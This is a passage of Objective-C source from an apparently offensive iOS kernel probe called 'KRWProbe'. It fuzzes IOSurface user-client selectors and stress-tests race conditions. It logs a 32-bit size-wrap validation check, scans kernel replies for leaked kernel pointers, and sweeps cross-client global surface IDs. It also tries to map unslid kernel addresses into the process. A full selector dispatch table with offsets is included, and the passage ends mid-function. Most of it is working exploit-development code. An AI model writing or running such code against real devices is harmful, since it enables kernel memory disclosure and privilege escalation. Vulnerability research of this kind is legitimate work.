                label, key, kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", insz, osz);
        if (kr == KERN_SUCCESS) {
            f1_emit(@"[F1] %s sel10 '%s' first 0x100 bytes:\n%@",
                    label, key, hexdump_lines(out, 0x100));
        }
        free(in10);
    }
}

static void f1_run_variant(io_connect_t conn, int idx, int total,
                           const F1Variant *v,
                           uint8_t *info, uint8_t *out, size_t outCap) {
    uint32_t wrapped = (uint32_t)(((uint32_t)v->dataPerSlice +
                                   (uint32_t)v->headerPerSlice) *
                                  (uint32_t)v->sliceCount);
    unsigned __int128 trueSize = ((unsigned __int128)v->dataPerSlice +
                                  v->headerPerSlice) * v->sliceCount;
    unsigned long long lo = (unsigned long long)trueSize;
    unsigned long long hi = (unsigned long long)(trueSize >> 64);

    f1_emit(@"[F1] --- variant %d/%d: %s ---", idx, total, v->name);
    f1_emit(@"[F1] fields: sliceCount=0x%llx dataPerSlice=0x%llx headerPerSlice=0x%llx "
            "planeSize=0x%llx alloc=0x%llx hdrRegionOff=0x%llx hdrGroupsRow=0x%llx",
            (unsigned long long)v->sliceCount,
            (unsigned long long)v->dataPerSlice,
            (unsigned long long)v->headerPerSlice,
            (unsigned long long)v->planeSize,
            (unsigned long long)v->allocSize,
            (unsigned long long)v->headerRegionOffset,
            (unsigned long long)v->headerGroupsRow);
    f1_emit(@"[F1] arithmetic: 32-bit (data+hdr)*slice = 0x%08x (%u); "
            "true 64-bit = 0x%llx%016llx (%llu bytes); planeSize 0x%llx",
            wrapped, wrapped, hi, lo,
            (unsigned long long)(trueSize > 0xffffffffffffffffULL ? 0 : (uint64_t)trueSize),
            (unsigned long long)v->planeSize);
    f1_emit(@"[F1] F1 wrap check: planeSize < 32-bit product ? %s (a pass here means "
            "the true 64-bit region %llu bytes was not compared)",
            (v->planeSize < (uint64_t)wrapped) ? "YES -> reject" : "NO -> accept",
            (unsigned long long)(trueSize > 0xffffffffffffffffULL ? 0 : (uint64_t)trueSize));

    NSString *xml = f1_xml(v);
    f1_emit(@"[F1] XML (%lu bytes, decimal integers; XML OSNumber width is 64):\n%@",
            (unsigned long)xml.length, xml);

    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc) + 1 : 0;
    if (!xc || xlen > 0x1000) {
        f1_emit(@"[F1] XML does not fit in the 0x1000 in-band limit (%zu); skipped", xlen);
        return;
    }
    uint64_t scIn[1] = { 0 };                 // parent id = 0, high 32 bits zero
    memset(info, 0, F1_INFO_SIZE);
    size_t isz = F1_INFO_SIZE;
    kern_return_t kr = IOConnectCallMethod(conn, 0, scIn, 1, xc, xlen,
                                           NULL, NULL, info, &isz);
    if (isz > F1_INFO_SIZE) isz = F1_INFO_SIZE;
    f1_emit(@"[F1] sel0 CREATE -> kr=0x%x (%u) %s structIn=%zu structOut=%zu/0xc68",
            kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", xlen, isz);
    uint32_t sid = (kr == KERN_SUCCESS && isz >= IOSURFACE_INFO_ID_OFF + 4)
                 ? rd32(info + IOSURFACE_INFO_ID_OFF) : 0;
    if (kr != KERN_SUCCESS || sid == 0) {
        f1_emit(@"[F1] variant %d: NOT created (no IOSurfaceInfo); kernel rejected the "
                "shape (0xe00002c2 does not say which check)", idx);
        return;
    }
    f1_emit(@"[F1] variant %d: CREATED surface id=%u", idx, sid);
    f1_info_fields("sel0", info, isz);
    f1_dump_response("sel0 response", info, isz);
    char label[16];
    snprintf(label, sizeof(label), "v%d", idx);
    f1_use_surface(conn, sid, label, info, out, outCap);
}

static void f1_loop_inner(void) {
    if (!gF1Lock) gF1Lock = [[NSLock alloc] init];

    if (!gF1Path && gRunDir)
        gF1Path = [gRunDir stringByAppendingPathComponent:@"f1.txt"];
    gF1File = gF1Path ? fopen(gF1Path.fileSystemRepresentation, "a") : NULL;
    if (gF1File) {
        setvbuf(gF1File, NULL, _IOLBF, 0);
    } else {
        L(@"[F1] fopen %@ failed: %s (screen log only)",
          gF1Path ?: @"(nil)", strerror(errno));
    }

    f1_emit(@"[F1] === KRWProbe %@ F1 run %@ ===", app_version(), [NSDate date]);
    f1_emit(@"[F1] shape: 64x64 BGRA, one plane 64x64 bpe=4 bpr=512, "
             "CT=4 (multi-slice interchange), tile 32x32, 2x2 tiles, "
             "hdrBytes=8 tileData=4096 tileRow=8192");
    f1_emit(@"[F1] each variant = ONE sel0 (scalarIn=1 parent=0, XML+NUL, "
             "structOut=0xc68) + sel2 + sel10 x2; wrapped product is logged from "
             "the exact XML fields before the call");
    f1_emit(@"[F1] f1.txt: %@", gF1Path ?: @"(none)");

    io_connect_t conn = leak_open_conn();
    if (!conn) {
        f1_emit(@"[F1] no IOSurfaceRoot connection");
        if (gF1File) { fclose(gF1File); gF1File = NULL; }
        return;
    }
    uint8_t *info = (uint8_t *)calloc(1, F1_INFO_SIZE);
    size_t outCap = 0x800;
    uint8_t *out = (uint8_t *)calloc(1, outCap);
    if (!info || !out) {
        f1_emit(@"[F1] buffer alloc failed (info=%p out=%p)", info, out);
        free(info); free(out); IOServiceClose(conn);
        if (gF1File) { fclose(gF1File); gF1File = NULL; }
        return;
    }

    int created = 0;
    for (int i = 0; i < kF1VariantCount && !gStop; i++) {
        @autoreleasepool {
            set_phase(@"F1 variant %d/%d", i + 1, kF1VariantCount);
            f1_run_variant(conn, i + 1, kF1VariantCount, &kF1Variants[i],
                           info, out, outCap);
            created++;
        }
    }
    (void)created;

    f1_emit(@"[F1] summary: variants=%d, connection=0x%x, stop=%d, f1.txt=%@",
            kF1VariantCount, conn, gStop, gF1Path ?: @"(none)");
    f1_emit(@"[F1] note: the kernel returns only 0xe00002c2 on rejection; the exact "
             "failing check is identified statically (VALIDATOR_AUDIT.md F1) and by "
             "the arithmetic line above");

    free(info);
    free(out);
    IOServiceClose(conn);        // destroys every surface created above
    if (gF1File) { fflush(gF1File); fclose(gF1File); gF1File = NULL; }
}

static void f1_loop(void) {
    if (gF1Busy) { L(@"[F1] already running"); return; }
    gF1Busy = 1;
    gStop = 0;
    @autoreleasepool { f1_loop_inner(); }
    gF1Busy = 0;
}


// ---- race stress ----
static NSString *random_key(void) {
    static NSString *keys[] = {
        @"IOSurfaceWidth", @"IOSurfaceHeight", @"IOSurfaceBytesPerRow",
        @"IOSurfaceBytesPerElement", @"IOSurfaceAllocSize", @"IOSurfacePixelFormat",
        @"IOSurfacePlaneInfo", @"IOSurfaceCompressionType",
        @"IOSurfacePlaneCompressionType", @"IOSurfaceSliceCount",
        @"IOSurfacePlaneDataRegionBytesPerSlice", @"IOSurfacePlaneHeaderRegionBytesPerSlice",
        @"IOSurfacePlaneBytesPerCompressedTileHeader", @"IOSurfacePlaneBytesPerTileData",
        @"IOSurfacePlaneWidthInCompressedTiles", @"IOSurfacePlaneHeightInCompressedTiles",
        @"IOSurfacePlaneHTPCPredictionSelector", @"IOSurfacePlaneHTPCVerticalHeaderGroupingMode",
        @"IOSurfacePlaneBytesPerRowOfTileData", @"IOSurfacePlaneCompressedTileWidth",
        @"IOSurfacePlaneCompressedTileHeight", @"IOSurfaceBitsPerBlock",
    };
    return keys[rnd() % (sizeof(keys)/sizeof(keys[0]))];
}
static NSNumber *random_number(void) {
    static uint64_t vals[] = {0,1,2,3,4,7,8,15,16,31,32,63,64,255,256,4096,65535,65536,
                              0x80000000ULL,0xffffffffULL,0x40000000ULL};
    return @(vals[rnd() % (sizeof(vals)/sizeof(vals[0]))]);
}

static void race_loop(int seconds) {
    set_phase(@"RACE %ds start", seconds);
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)base_props(512, 512));
    if (!s) { L(@"race: surface create failed"); return; }
    L(@"--- RACE %ds on id=%u ---", seconds, IOSurfaceGetID(s));
    gStop = 0;
    dispatch_group_t g = dispatch_group_create();
    dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0);

    dispatch_group_async(g, q, ^{
        while (!gStop) {
            @autoreleasepool {
                NSString *k = random_key();
                write_both(@"", gLastPath, gLastPathTmp);
                IOSurfaceSetValue(s, (__bridge CFStringRef)k, (__bridge CFTypeRef)random_number());
                if ((rnd() & 7) == 0) IOSurfaceRemoveValue(s, (__bridge CFStringRef)k);
            }
        }
    });
    for (int t = 0; t < 3; t++) {
        dispatch_group_async(g, q, ^{
            while (!gStop) {
                @autoreleasepool {
                    uint32_t seed = 0;
                    IOSurfaceLock(s, 0, &seed);
                    volatile size_t n = IOSurfaceGetPlaneCount(s);
                    if (n) IOSurfaceGetBytesPerRowOfPlane(s, 0);
                    IOSurfaceUnlock(s, 0, &seed);
                }
            }
        });
    }
    dispatch_group_async(g, q, ^{
        while (!gStop) {
            @autoreleasepool {
                CFArrayRef arr = (__bridge CFArrayRef)@[ @{ @"IOSurfacePlaneWidth": @(512),
                                                           @"IOSurfacePlaneHeight": @(512),
                                                           @"IOSurfacePlaneBytesPerElement": @(4),
                                                           @"IOSurfacePlaneBytesPerRow": @(2048) } ];
                IOSurfaceSetValue(s, CFSTR("IOSurfacePlaneInfo"), arr);
            }
        }
    });
    (void)dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, (int64_t)seconds * NSEC_PER_SEC));
    gStop = 1;
    long wr = dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
    if (wr != 0) {
        L(@"--- RACE: threads still running after stop, surface leaked on purpose ---");
        return;                              // never CFRelease under a live reader
    }
    CFRelease(s);
    set_phase(@"RACE done");
    L(@"--- RACE done ---");
}


// ---- user-client selector fuzzer ----
static void uc_fuzz(const char *cls, int iters) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(cls));
    if (!svc) { L(@"uc_fuzz %s: no service", cls); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { L(@"uc_fuzz %s: IOServiceOpen kr=0x%x (denied)", cls, kr); return; }
    L(@"--- uc_fuzz %s: conn=%u, %d iters ---", cls, conn, iters);
    set_phase(@"UC fuzz %s", cls);
    gStop = 0;
    uint8_t sbuf[512];
    uint8_t obuf[512];
    for (int i = 0; i < iters && !gStop; i++) {
        @autoreleasepool {
            uint64_t scalar[6];
            uint32_t nscalar = (uint32_t)(rnd() % 7);      // 0..6
            if (nscalar > 6) nscalar = 6;
            for (uint32_t k = 0; k < nscalar; k++) {
                static uint64_t vals[] = {0,1,2,3,4,8,16,32,64,128,256,512,4096,65536,
                                          0x80000000ULL,0xffffffffULL,0xffffffffffffffffULL};
                scalar[k] = vals[rnd() % (sizeof(vals)/sizeof(vals[0]))];
            }
            uint32_t slen = (uint32_t)(rnd() % 257);        // 0..256 bytes
            if (slen > sizeof(sbuf)) slen = sizeof(sbuf);
            for (uint32_t k = 0; k < slen; k++) sbuf[k] = (uint8_t)rnd();
            uint32_t olen = 0; size_t oslen = sizeof(obuf);
            uint64_t sel = rnd() % 64;
            NSString *rec = [NSString stringWithFormat:@"{\"cls\":\"%s\",\"sel\":%llu,\"ns\":%u,\"slen\":%u}",
                             cls, sel, nscalar, slen];
            write_both(rec, gLastPath, gLastPathTmp);
            IOConnectCallMethod(conn, (uint32_t)sel, scalar, nscalar, sbuf, slen,
                                NULL, &olen, obuf, &oslen);
            if ((i % 5000) == 0) {
                set_phase(@"UC fuzz %s: %d/%d", cls, i, iters);
                L(@"uc_fuzz %s %d/%d (sel=%llu)", cls, i, iters, sel);
            }
        }
    }
    IOServiceClose(conn);
    set_phase(@"UC fuzz %s done", cls);
    L(@"--- uc_fuzz %s done ---", cls);
}


// ---- small-scalar scan: scalar0 in {0,1}, struct size sweep ----
static void scan_selectors(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"scan: no service"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { L(@"scan: open kr=0x%x", kr); return; }
    uint8_t sin[2048]; memset(sin, 0, sizeof(sin));
    uint8_t soutb[512];
    set_phase(@"SCAN sel 0..12");
    gStop = 0;
    for (uint32_t sel = 0; sel < 13 && !gStop; sel++) {
        int found = 0;
        NSMutableString *line = [NSMutableString string];
        for (uint32_t s0 = 0; s0 <= 1 && !gStop; s0++) {
            for (uint32_t sl = 0; sl <= sizeof(sin) && !gStop; sl += 8) {
                uint64_t sc[1] = {s0};
                uint64_t out[8]; memset(out, 0, sizeof(out));
                uint32_t oc = 8; size_t osc = sizeof(soutb); memset(soutb, 0, sizeof(soutb));
                kern_return_t r = IOConnectCallMethod(conn, sel, sc, 1, sl ? sin : NULL, sl,
                                                      out, &oc, soutb, &osc);
                if (r != 0xe00002c2) {
                    found++;
                    if (found <= 8) [line appendFormat:@" s0=%u/sl=%u:0x%x", s0, sl, r];
                }
            }
        }
        L(@"sel %2u: non-badsize=%d%@", sel, found, line);
        set_phase(@"SCAN sel %u/12", sel);
    }
    IOServiceClose(conn);
    set_phase(@"SCAN done");
    L(@"--- s0 scan done ---");
}

static void run_safe(void) {
    struct utsname u; uname(&u);
    set_phase(@"SAFE: sysctl + last files");
    L(@"=== KRWProbe %@ ===", app_version());
    L(@"machine=%s release=%s os=%@ build=%@", u.machine, u.release,
      sysctl_str("kern.osversion"), sysctl_str("kern.osbuildversion"));
    L(@"kern.version=%s", kern_version().UTF8String);
    L(@"hw.model=%s memsize=%s", sysctl_str("hw.model").UTF8String, sysctl_str("hw.memsize").UTF8String);
    L(@"pid=%d uid=%d euid=%d", getpid(), getuid(), geteuid());
    L(@"Documents run dir: %@", gRunDirDocs ?: @"FAILED");
    L(@"tmp run dir: %@", gRunDirTemp ?: @"FAILED");
    L(@"active run dir: %@", gRunDir);
    if (gRunSetupError) L(@"[ERROR] run setup: %@", gRunSetupError);
    NSString *lastPhase = read_capped(gLastPhasePath);
    if (lastPhase.length) L(@"*** LAST PHASE (crash candidate): %@", lastPhase);
    NSString *lastJson = read_capped(gLastPath);
    if (lastJson.length) L(@"*** LAST FUZZ CONFIG (crash candidate): %@", lastJson);
    NSString *lastXml = read_capped(gMutatePath);
    if (lastXml.length) L(@"*** LAST MUTATE CONFIG (crash candidate):\n%@", lastXml);
    NSString *lastAction = read_capped(gActionPath);
    if (lastAction.length) L(@"*** LAST HARD ACTION (crash candidate): %@", lastAction);
    set_phase(@"SAFE: surfaces");
    L(@"--- surfaces ---");
    test_basic();
    test_planes(1, 256, 256);
    test_planes(2, 256, 256);
    test_planes(4, 256, 256);
    test_planes(8, 256, 256);
    set_phase(@"SAFE: user clients");
    test_user_clients();
    set_phase(@"SAFE done");
    L(@"=== safe done ===");
}

// ============================================================================


// ============================================================================
//  1.9 — SELSCAN + GATES
//
//  DISPATCHER_RE.md gives the exact 60-entry IOExternalMethodDispatch2022
//  table of IOSurfaceRootUserClient (sMethods @ 0xfffffff008068b90).  The 1.2
//  scan_selectors() probed selectors 0-12 with a wrong fixed ABI (always 1
//  scalarIn, 8 scalarOut) and got 0xe00002c2 everywhere.  1.9 probes EVERY
//  selector with the EXACT counts from the table, dumps every response, and
//  scans every response for kernel-range pointers that LEAK mode missed
//  (LEAK only looked at sel 10).
//
//  Static audit notes (27.2 24B115) driving the expectations:
//   - sel 13: "SetNLPort" — 1 scalar, name >= 0x200, must be NUL-terminated,
//     no OOL.  Probe payload: 0x210 zero bytes with a short name at +0x1f8.
//   - sel 17/18/19: lock/unlock/set-port-name.  sel 17 scalarInput[2] selects
//     the FUN_9c3d408 branch (fixed by CVE-2026-112477 lock).  sel 19 writes
//     the string into the client's port-name slot (0x200 bytes, "%.512s" cap).
//   - sel 24: 0xc-header + XML plist in, no out (3d560 property engine).
//   - sel 26: 0xc-header + plist in, var out; same 0x3f77c engine as sel 10.
//   - sel 27: 0xa0 structIn = raw IOSurface creation-properties (framework
//     IOSurfaceCreate path).  Out unused by the table (szo=0).
//   - sel 45: 0x20 structIn + scalars, szi=var.  46: var in, 2 scalarOut.
//   - sel 47/48: memory-pool port ops (need a port whose kernel object is the
//     pool class; expected 0xe00002c2 for every port an app owns).
//   - sel 49: 1 scalarIn, OOL-in only, 2 scalarOut.  50: OOL-in + OOL-out.
//   - sel 51: OOL-out.  52/53: 0x28-in engine calls.  54-58: misc getters.
//
//  GATES: static gate hunt for AppleAVE2Driver (device: 0xe00002bd) and
//  AGXAcceleratorG14P (device: 0xe00002c7).  No entitlement string is in
//  either path; the probe sweeps client types 0-8 to separate
//  "sandbox said no" from "client type said no".
// ============================================================================

// ---- sMethods table (DISPATCHER_RE.md, 27.2 24B115) ----
// {handler, scalarInputCount, structureInputSize, scalarOutputCount,
//  structureOutputSize, allowAsync}  0xffffffff = unspecified/variable
#define SSZ 0xffffffffu
typedef struct { uint8_t sel; uint32_t si, szi, so, szo; const char *note; } SRow;
static const SRow kSelTable[] = {
    { 0, 1, SSZ, 0, 0xc68, "create (info out)" },
    { 1, 1, 0, 0, 0, "release by id" },
    { 2, 0, 0xc, 0, 0xc68, "use+info" },
    { 3, 0, 0xc, 0, 4, "use-" },
    { 4, 1, 0, 0, 0xc68, "lookup (gpu-restricted)" },
    { 5, 2, 0, 0, 0, "set flag (gr)" },
    { 6, 0, 0x20, 0, 0xc68, "create from memory (gr)" },
    { 7, 2, 0, 0, 0xc68, "create from range (gr)" },
    { 8, 1, 0, 1, 0, "read flag (gr)" },
    { 9, 0, SSZ, 0, 4, "set value (plist)" },
    { 10, 0, SSZ, 0, SSZ, "get value" },
    { 11, 0, SSZ, 0, 4, "remove value" },
    { 12, 3, 0, 0, 0, "use-count" },
    { 13, 1, 0, 0, 0, "create from memory 2" },
    { 14, 2, 0, 0, 0, "trap-ish" },
    { 15, 2, 0, 0, 0, "trap-ish" },
    { 16, 1, 0, 1, 0, "get scalar" },
    { 17, 0, 0x18, 0, 0, "lock" },
    { 18, 0, 0x18, 0, 0, "unlock" },
    { 19, 0, SSZ, 0, 0, "set port name" },
    { 20, 2, 0, 1, 0, "get scalar" },
    { 21, 4, 0, 0, 0, "lock/unlock variant" },
    { 22, 2, 0, 0, 0, "use" },
    { 23, 1, 0, 1, 0, "get scalar" },
    { 24, 0, SSZ, 0, 0, "plist engine (no out)" },
    { 25, 1, 0, 1, 0, "get scalar" },
    { 26, 0, SSZ, 0, SSZ, "plist engine var out" },
    { 27, 0, 0xa0, 0, 0, "raw create-props" },
    { 28, 1, 0, 0, 0xa0, "get create-props" },
    { 29, 2, 0, 0, 0, "attach" },
    { 30, 1, 0, 0, SSZ, "attachment out var" },
    { 31, 3, 0, 0, 0, "attach" },
    { 32, 0, 0, 1, 0, "scalar out only" },
    { 33, 3, 0, 0, 0, "attach" },
    { 34, 1, 0, 0, 0xc68, "info out" },
    { 35, 2, 0, 1, 0, "scalar out" },
    { 36, 1, 0, 2, 0, "2 scalar out" },
    { 37, 2, 0, 0, 0, "attach" },
    { 38, 1, 0, 4, 0, "4 scalar out" },
    { 39, 5, 0, 0, 0, "attach" },
    { 40, 0, 0, 0, 0, "async flag" },
    { 41, 1, 0, 0, 0, "fence" },
    { 42, 4, 0, 0, 0, "fence" },
    { 43, 4, 0, 0, 0, "fence" },
    { 44, 4, 0, 0, 0, "fence" },
    { 45, 3, SSZ, 0, 0, "engine + var in" },
    { 46, 0, SSZ, 2, 0, "engine var, 2 scalar out" },
    { 47, 1, SSZ, 0, 0, "pool flush" },
    { 48, 1, SSZ, 0, 0, "pool dump (OOL out)" },
    { 49, 1, SSZ, 0, 0, "OOL in only" },
    { 50, 2, SSZ, 0, 0, "OOL in" },
    { 51, 2, 0, 2, SSZ, "OOL out" },
    { 52, 1, 0, 0, 0, "engine" },
    { 53, 0, SSZ, 0, 0, "engine var in" },
    { 54, 1, 0, 1, 0, "scalar out" },
    { 55, 2, 0, 0, 0, "attach" },
    { 56, 2, 0, 0, 0, "attach" },
    { 57, 4, 0, 0, 0, "attach" },
    { 58, 5, 0, 3, 0, "3 scalar out" },
    { 59, 1, 0, 0, 0, "misc" },
};
#define kSelCount ((int)(sizeof(kSelTable) / sizeof(kSelTable[0])))

static NSLock *gSSLock;
static FILE *gSSFile;
static NSString *gSSPath;
static volatile int gSSBusy;

static void ss_emit(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *body = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (!body) body = @"(log format failed)";
    if (!gSSLock) gSSLock = [[NSLock alloc] init];
    [gSSLock lock];
    if (gSSFile) {
        const char *u = body.UTF8String;
        if (u) { fwrite(u, 1, strlen(u), gSSFile); fputc('\n', gSSFile); fflush(gSSFile); }
    }
    L(@"%@", body);
    [gSSLock unlock];
}

static NSString *gSSShortName;

static void ss_dump_bytes(NSString *tag, const uint8_t *p, size_t n) {
    if (!n) { ss_emit(@"[%@] (empty)", tag); return; }
    if (n > 0x100) n = 0x100;
    NSMutableString *s = [NSMutableString string];
    for (size_t i = 0; i < n; i += 16) {
        [s appendFormat:@"  +0x%03zx:", i];
        for (size_t j = 0; j < 16 && i + j < n; j++) [s appendFormat:@" %02x", p[i + j]];
        [s appendString:@"\n"];
    }
    ss_emit(@"[%@] %zu bytes:\n%@", tag, n, s);
}

// Every response tail (from 0x90 on, or the whole thing when short) is scanned
// for 8-byte words that look like kernel pointers.  LEAK established that sel
// 10 ships none; 1.9 extends the same test to all 59 other selectors.
static int ss_scan_ptrs(const uint8_t *p, size_t n, char *out, size_t outCap) {
    int hits = 0;
    out[0] = 0;
    size_t from = n > 0x90 ? 0x90 : 0;
    for (size_t i = from; i + 8 <= n; i += 4) {
        uint64_t v; memcpy(&v, p + i, 8);
        BOOL ktext = (v >= 0xfffffff007004000ULL && v < 0xfffffff00aa78000ULL);
        BOOL krange = (v >= 0xfffffff000000000ULL && v < 0xfffffff800000000ULL);
        BOOL sx32 = (v >= 0xffffffff80000000ULL && v <= 0xffffffffffffffffULL);
        if (ktext || (krange && !sx32)) {
            hits++;
            char line[96];
            snprintf(line, sizeof(line), "+0x%zx=0x%016llx%s ", i,
                     (unsigned long long)v, ktext ? "[TEXT]" : "[K]");
            if (strlen(out) + strlen(line) < outCap) strlcat(out, line, outCap);
        }
    }
    return hits;
}

// Whole-structure kernel-pointer scan.  The SELSCAN tail scan starts at 0x90;
// the IOSurfaceInfo header is exactly where a leaked surface base would land,
// so scan every 8-byte word here.
static int ss_scan_all64(const uint8_t *p, size_t n, char *out, size_t outCap) {
    int hits = 0;
    out[0] = 0;
    for (size_t i = 0; i + 8 <= n; i += 8) {
        uint64_t v; memcpy(&v, p + i, 8);
        BOOL ktext = (v >= 0xfffffff007004000ULL && v < 0xfffffff00aa78000ULL);
        BOOL krange = (v >= 0xfffffff000000000ULL && v < 0xfffffff800000000ULL);
        BOOL sx32 = (v >= 0xffffffff80000000ULL && v <= 0xffffffffffffffffULL);
        if (ktext || (krange && !sx32)) {
            hits++;
            char line[96];
            snprintf(line, sizeof(line), "+0x%zx=0x%016llx%s ", i,
                     (unsigned long long)v, ktext ? "[TEXT]" : "[K]");
            if (strlen(out) + strlen(line) < outCap) strlcat(out, line, outCap);
        }
    }
    return hits;
}

static void ss_log_info(const char *tag, uint32_t asked, const uint8_t *info, size_t n,
                        kern_return_t kr) {
    if (n < 0x78) {
        ss_emit(@"[GMAP] %s id=%u kr=0x%x short info len=%zu", tag, asked, kr, n);
        return;
    }
    uint64_t base = 0; memcpy(&base, info + 0x10, 8);
    uint32_t sid = rd32(info + 0x18);
    uint32_t planes = rd32(info + 0x58);
    uint32_t pix = rd32(info + 0x64);
    uint32_t use = rd32(info + 0x68);
    uint32_t slice = rd32(info + 0x74);
    char ptrs[512];
    int hits = ss_scan_all64(info, n, ptrs, sizeof(ptrs));
    ss_emit(@"[GMAP] %s asked=%u kr=0x%x info.id=%u planes=%u pix=0x%x use=%u slice=%u "
             "base=0x%016llx ptrs=%d%@",
            tag, asked, kr, sid, planes, pix, use, slice,
            (unsigned long long)base, hits,
            hits ? [NSString stringWithFormat:@" %@", [NSString stringWithUTF8String:ptrs]] : @"");
    // If the header base is a kernel address, this is already the leak.
    if (base >= 0xfffffff000000000ULL) {
        ss_emit(@"[GMAP] *** KERNEL BASE IN IOSurfaceInfo: 0x%016llx ***",
                (unsigned long long)base);
    }
    ss_dump_bytes([NSString stringWithFormat:@"GMAP %s info", tag], info, n > 0x100 ? 0x100 : n);
}

// sel4 is the documented "lookup by global ID" path and the code in
// FUN_9c33548 accepts cross-client lookups (it only logs "insecure global
// IOSurface lookup").  The probe never tried a valid ID because the old scan
// always passed scalarInput[0] = 0.  Sweep the whole global slot range.
static void ss_global_lookup_sweep(io_connect_t conn, uint32_t maxId) {
    uint8_t *info = (uint8_t *)calloc(1, 0xc68);
    if (!info) { ss_emit(@"[GMAP] alloc failed"); return; }
    int found = 0, errors = 0;
    ss_emit(@"[GMAP] global lookup sweep: sel4, scalarIn={id}, ids 1..%u, out=0xc68", maxId);
    for (uint32_t id = 1; id < maxId && !gStop; id++) {
        uint64_t sid = id;
        size_t olen = 0xc68;
        memset(info, 0, 0xc68);
        kern_return_t kr = IOConnectCallMethod(conn, 4, &sid, 1, NULL, 0,
                                               NULL, NULL, info, &olen);
        if (kr == 0) {
            found++;
            ss_log_info("global", id, info, olen, kr);
            if (found <= 16) ss_emit(@"[GMAP] global id=%u: map skipped (safe mode)", id);
            if (found >= 64) {
                ss_emit(@"[GMAP] stopping after 64 global surfaces");
                break;
            }
        } else {
            errors++;
        }
        if ((id & 0x3ff) == 0) set_phase(@"GMAP %u/%u found=%d", id, maxId, found);
    }
    ss_emit(@"[GMAP] global sweep done: found=%d errors=%d", found, errors);
    free(info);
}

// sel7 = create surface from a caller address range.  The kernel's
// FUN_9c2200c validates the range against the client task, but the check is
// exactly the thing worth testing: a user address is the control, a kernel
// address must fail.  If it does not, IOSurfaceGetBaseAddress maps kernel
// memory into this process.
static void ss_try_range(io_connect_t conn, const char *tag, uint64_t addr, uint64_t len) {
    uint8_t *info = (uint8_t *)calloc(1, 0xc68);
    if (!info) return;
    uint64_t sc[2] = { addr, len };
    size_t olen = 0xc68;
    kern_return_t kr = IOConnectCallMethod(conn, 7, sc, 2, NULL, 0,
                                           NULL, NULL, info, &olen);
    ss_log_info(tag, 0, info, olen, kr);
    // 2.2 SAFE: do not IOSurfaceLookup/map here.  A foreign/global surface can
    // return a mapping the sandbox cannot dereference; the 2.1 build crashed
    // on exactly that read.  The info header already tells us whether base is
    // a kernel VA.
    if (kr == 0) {
        uint32_t sid = rd32(info + 0x18);
        ss_emit(@"[GMAP] %s id=%u: map skipped (safe mode)", tag, sid);
    }
    free(info);
}

static void ss_addr_range_tests(io_connect_t conn) {
    // Control: a page-aligned anonymous user mapping.
    void *u = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANON, -1, 0);
    if (u != MAP_FAILED) {
        memset(u, 0x41, 0x4000);
        ss_try_range(conn, "user-control", (uint64_t)(uintptr_t)u, 0x4000);
        munmap(u, 0x4000);
    }
    // Unslid kernel addresses (27.2 T8110): __TEXT base, __TEXT_EXEC, a known
    // function.  A KASLR slide means these may be unmapped; a success on any
    // one of them is still a broken validation and a direct kernel mapping.
    ss_try_range(conn, "kern-text-unslid", 0xfffffff007004000ULL, 0x4000);
    ss_try_range(conn, "kern-exec-unslid", 0xfffffff00814c000ULL, 0x4000);
    ss_try_range(conn, "kern-fn-unslid",   0xfffffff00a9e2000ULL, 0x4000);
}

static kern_return_t ss_probe_one(io_connect_t conn, const SRow *r,
                         uint8_t *inBuf, size_t inCap,
                         uint8_t *outBuf, size_t outCap) {
    uint64_t scIn[8] = { 0, 0, 0, 0, 0, 0, 0, 0 };
    uint64_t scOut[8] = { 0, 0, 0, 0, 0, 0, 0, 0 };
    uint32_t si = r->si, so = r->so;
    if (si > 8 || so > 8) { ss_emit(@"[sel %u] bad counts", r->sel); return 0xe00002c2; }
    uint32_t szi = r->szi, szo = r->szo;
    size_t inLen = 0;
    if (szi != SSZ && szi <= inCap) { inLen = szi; }
    else if (szi == SSZ) { inLen = r->sel == 13 ? 0x210 : 0x100; }

    // Prefill every input with the KRWProbe marker so kernel-copied bytes are
    // distinguishable from our own buffer; tails that come back unchanged are
    // user-initialized (MIG copies the request), changed tails are kernel data.
    for (size_t i = 0; i < outCap; i++) outBuf[i] = (uint8_t)(0xA5);
    memset(inBuf, 0, inCap);
    if (inLen) {
        memcpy(inBuf, "KRW1", 4);
        for (size_t i = 4; i < inLen; i++) inBuf[i] = (uint8_t)(i & 0xff);
        if (inLen >= 0x210 && r->sel == 13) {
            strcpy((char *)inBuf + 0x1f8, "KRWPORT");
        }
        if (inLen >= 0xa0) { /* sel 27 raw props: zeros are fine, shape probed */ }
    }
    size_t outLen;
    if (szo == SSZ || szo == 0) {
        outLen = outCap;
    } else {
        // 2.3: never clamp a fixed structureOutputSize.  sel0/sel2/sel4/sel6/
        // sel7/34 require exactly 0xc68; passing 0x800 is what killed 2.1
        // before the first [sel] line.  If the table asks for more than the
        // caller's buffer, skip instead of lying about the size.
        if (szo > outCap) {
            ss_emit(@"[sel %u] skip: table wants szo=%u, buffer=%zu",
                    r->sel, szo, outCap);
            return 0xe00002c2;
        }
        outLen = szo;
    }

    kern_return_t kr = IOConnectCallMethod(conn, r->sel,
                                           si ? scIn : NULL, si,
                                           inLen ? inBuf : NULL, inLen,
                                           so ? scOut : NULL, so ? &so : NULL,
                                           outLen ? outBuf : NULL, outLen ? &outLen : NULL);
    const char *verdict;
    if (kr == 0) verdict = "OK";
    else if (kr == 0xe00002c2) verdict = "BadArgument";
